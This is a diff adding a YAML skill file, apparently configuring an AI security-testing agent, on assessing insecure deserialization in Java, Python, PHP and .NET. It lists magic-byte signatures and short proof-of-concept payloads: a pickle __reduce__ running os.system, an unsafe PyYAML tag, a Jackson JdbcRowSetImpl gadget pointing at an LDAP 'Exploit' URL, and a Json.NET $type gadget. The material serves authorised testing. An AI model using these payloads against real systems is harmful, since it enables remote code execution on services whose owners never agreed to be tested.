@@ -1,0 +1,60 @@
+schema_version: 1
+version: 3.0.0
+name: insecure-deserialization
+description: Senior Insecure Deserialization assessment across Java, Python, PHP, and .NET — magic byte recognition, object injection, gadget chain identification, and safe validation.
+triggers:
+  - deserialization
+  - insecure deserialization
+  - pickle
+  - unserialize
+  - binaryformatter
+  - ysoserial
+  - java deserialization
+  - php object injection
+  - phar
+  - viewstate
+tools:
+  - curl
+knowledge: |
+  Assess Insecure Deserialization vulnerabilities with senior red-team precision across byte-stream unmarshaling, object injection, and runtime gadget chains.
+
+  1. MAGIC BYTE SIGNATURES & RECONNAISSANCE:
+     Identify opaque tokens, session cookies, and hidden form fields containing serialized objects:
+     • Java Native Serialization: starts with hex bytes `ac ed 00 05` (base64 encoded as `rO0AB...`).
+     • PHP Serialized Objects: decoded strings beginning with class markers `O:<len>:"<class>":<props>:{...}` or arrays `a:<len>:{...}`.
+     • .NET BinaryFormatter: starts with hex bytes `00 01 00 00 00 ff ff ff ff` (base64 encoded as `AAEAAAD/////`).
+     • Python Pickle: begins with protocol opcode markers (hex `\x80\x02`, `\x80\x03`, `\x80\x04`).
+
+  2. PYTHON PICKLE & UNSAFE YAML UNMARSHALING:
+     - Pickle executes arbitrary callables during reconstruction via the `__reduce__` tuple:
+       A class defining `def __reduce__(self): return (os.system, ('id',))` executes upon `pickle.loads()`.
+     - PyYAML Unsafe Evaluation:
+       When applications use `yaml.load(data)` without `yaml.SafeLoader`:
+       `!!python/object/apply:os.system ["id"]`
+
+  3. PHP OBJECT INJECTION & PHAR DESERIALIZATION:
+     - Sinks: User-supplied strings passed to `unserialize()`.
+     - Magic Method Execution: Exploits `__wakeup()`, `__destruct()`, `__toString()`, and `__call()` within loaded classes to assemble POP (Property-Oriented Programming) chains.
+     - Phar Metadata Deserialization:
+       Any filesystem function (`file_exists`, `is_file`, `md5_file`) operating on a `phar://` URL path automatically deserializes the archive's internal metadata object.
+
+  4. JAVA GADGET CHAINS & POLYMORPHIC JSON TYPING:
+     - `ObjectInputStream.readObject()` sinks process serialized gadget chains (e.g. Commons Collections, Spring, Groovy).
+     - Jackson JSON Polymorphic Typing:
+       When `enableDefaultTyping` or `@JsonTypeInfo(use = Id.CLASS)` is enabled on untrusted endpoints:
+       `["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://127.0.0.1:1389/Exploit", "autoCommit":true}]`
+
+  5. .NET BINARYFORMATTER & JSON.NET TYPENAMEHANDLING:
+     - BinaryFormatter is fundamentally insecure on untrusted input; gadget chains achieve execution via `ObjectDataProvider`.
+     - Json.NET TypeNameHandling:
+       When `TypeNameHandling` is not set to `None`:
+       `{"$type": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install", "Path": "..."}`
+
+  6. VERIFICATION & IMPACT DEMONSTRATION:
+     - Verify execution non-destructively: trigger an execution check (`id` / `whoami`) or DNS pingback.
+     - Never inject destructive payloads that alter application database state.
+references:
+  - persona:insecure-deserialization-v3
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/insecure-deserialization.yaml
